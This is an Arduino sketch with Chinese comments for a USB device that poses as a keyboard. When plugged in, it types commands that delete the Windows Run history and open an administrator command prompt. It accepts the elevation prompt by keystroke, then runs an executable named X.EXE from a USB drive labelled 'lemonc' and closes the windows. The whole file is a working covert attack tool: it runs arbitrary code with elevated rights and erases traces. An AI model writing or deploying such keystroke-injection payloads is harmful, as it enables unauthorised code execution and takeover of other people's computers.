void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /c REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&POWERSHELL -C START-PROCESS -fILEPATH CMD -VERB RUNAS");
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
 delay(1000);
  Keyboard.println();
  delay(300);
  Keyboard.println("FOR /F %A IN (\'WMIC VOLUME GET DRIVELETTER^,LABEL ^| fIND \"lemonc\"\') DO (SET AB=%A)");  //lemonc可替换
  delay(300);
  Keyboard.println("%AB%\\X.EXE&&TASKKILL /F /IM CMD.EXE");
 Keyboard.press(KEY_CAPS_LOCK);
 Keyboard.release(KEY_CAPS_LOCK);
 Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{ 
}
